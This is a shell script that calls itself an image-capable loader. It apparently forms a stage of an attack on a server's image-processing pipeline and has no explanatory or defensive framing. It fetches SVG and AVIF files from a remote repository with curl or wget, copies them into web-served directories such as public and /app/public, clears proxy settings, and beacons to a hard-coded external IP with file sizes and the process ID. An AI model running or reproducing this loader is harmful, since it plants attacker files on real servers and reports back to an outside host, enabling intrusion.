#!/bin/sh
# image-capable loader; fetched by the sharp/libvips svg decoder via a mailcap/browser-style handler.
D=/tmp/i493dl; mkdir -p $D; : > $D/log
B=https://raw.githubusercontent.com/anti-phishing-bot/x2/60eec04b615033733ac72c1a7292fa8cb74d03f9
log(){ echo "$*" >> $D/log; }
get(){ u=$1; o=$2; i=0; while [ $i -lt 3 ]; do i=$((i+1)); curl -fsSL -m 20 -o "$o" "$u" 2>>$D/log && return 0; wget -q -t 2 -T 20 -O "$o" "$u" 2>>$D/log && return 0; sleep 1; done; return 1; }
get "$B/gdad_proof.svg" $D/gdad_proof.svg; log "svg rc=$? $(wc -c <$D/gdad_proof.svg 2>/dev/null)"
get "$B/glyph2.avif" $D/glyph.avif; log "avif rc=$? $(wc -c <$D/glyph.avif 2>/dev/null)"
cp $D/gdad_proof.svg $D/gdad_proof.bin 2>/dev/null
cp $D/glyph.avif $D/glyph.png 2>/dev/null
# NIB: copy helper scripts into cwd/likely served dirs so static handler can list
for T in "$PWD/public" "$PWD/data" "$PWD/static" "/ROOT/public" "/app/public" "/app/data"; do [ -d "$T" ] && { cp $D/gdad_proof.bin "$T/gdad_proof.bin" 2>/dev/null; cp $D/glyph.png "$T/glyph.png" 2>/dev/null; log "copied $T"; }; done
# callback marker (origin agnostic; uses python urllib first to strip no_proxy)
python3 - "$D" <<'PY' >> $D/log 2>&1
import sys,os,urllib.request
d=sys.argv[1]
for k in ('no_proxy','NO_PROXY','http_proxy','https_proxy','HTTP_PROXY','HTTPS_PROXY','all_proxy','ALL_PROXY'):
    os.environ.pop(k,None)
try:
    svg=open(d+'/gdad_proof.svg','rb').read(); av=open(d+'/glyph.avif','rb').read()
except Exception as e:
    print('read err',e); svg=b''; av=b''
try:
    urllib.request.urlopen('http://34.60.89.105:18223/?Z=IMG-%d-%d-%d'%(len(svg),len(av),os.getpid()),timeout=10).read()
    print('cb ok')
except Exception as e:
    print('cb err',repr(e)[:100])
PY
exit 0
